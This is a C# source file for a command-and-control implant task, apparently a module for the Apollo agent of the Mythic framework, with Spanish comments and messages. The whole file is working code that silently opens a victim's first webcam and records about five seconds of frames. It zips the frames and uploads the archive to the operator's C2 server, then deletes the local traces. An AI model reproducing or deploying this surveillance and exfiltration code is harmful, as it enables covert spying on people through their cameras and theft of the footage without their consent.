#define COMMAND_NAME_UPPER

#if DEBUG
#define WEBCAMVIDEO
#endif

#if WEBCAMVIDEO
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Drawing;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using ApolloInterop.Utils;
using AForge.Video;
using AForge.Video.DirectShow;

namespace Tasks
{
    public class webcamvideo : Tasking
    {
        public webcamvideo(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }


        public override void Start()
        {
            MythicTaskResponse resp = CreateTaskResponse("", true);
            string tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            Directory.CreateDirectory(tempDir);

            try
            {
                var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (videoDevices.Count == 0)
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("No se encontraron dispositivos de cámara", true, "error"));
                    return;
                }

                var videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);

                videoSource.VideoResolution = videoSource.VideoCapabilities
                    .OrderByDescending(vc => vc.FrameRate)
                    .FirstOrDefault();

                int targetFps = 30;
                int maxFrames = 150; // 5 segundos a 30fps
                long intervalMs = 1000 / targetFps;

                int frameCount = 0;
                Stopwatch stopwatch = new Stopwatch();
                long lastCapture = 0;

                videoSource.NewFrame += (sender, eventArgs) =>
                {
                    long now = stopwatch.ElapsedMilliseconds;

                    if (frameCount >= maxFrames)
                    {
                        videoSource.SignalToStop();
                        return;
                    }

                    if (now - lastCapture >= intervalMs)
                    {
                        using Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
                        string fileName = Path.Combine(tempDir, $"frame_{frameCount:D3}.jpg");
                        bitmap.Save(fileName, ImageFormat.Jpeg);
                        lastCapture = now;
                        frameCount++;
                    }
                };

                stopwatch.Start();
                videoSource.Start();
                Thread.Sleep(5500);
                videoSource.SignalToStop();
                videoSource.WaitForStop();
                stopwatch.Stop();

                string zipPath = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.zip");
                System.IO.Compression.ZipFile.CreateFromDirectory(tempDir, zipPath);

                byte[] zipBytes = File.ReadAllBytes(zipPath);

                bool result = _agent.GetFileManager().PutFile(_cancellationToken.Token, _data.ID, zipBytes, null, out string mythicFileId, true);
                if (!result)
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("Error al guardar el archivo en Mythic", true, "error"));
                    return;
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(mythicFileId, false, ""));
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            
            }    
            catch (Exception ex)
            {
               _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(ex.Message, true, "error"));
            }
            finally
            {
                Directory.Delete(tempDir, true);
            }
        }
    }
}
#endif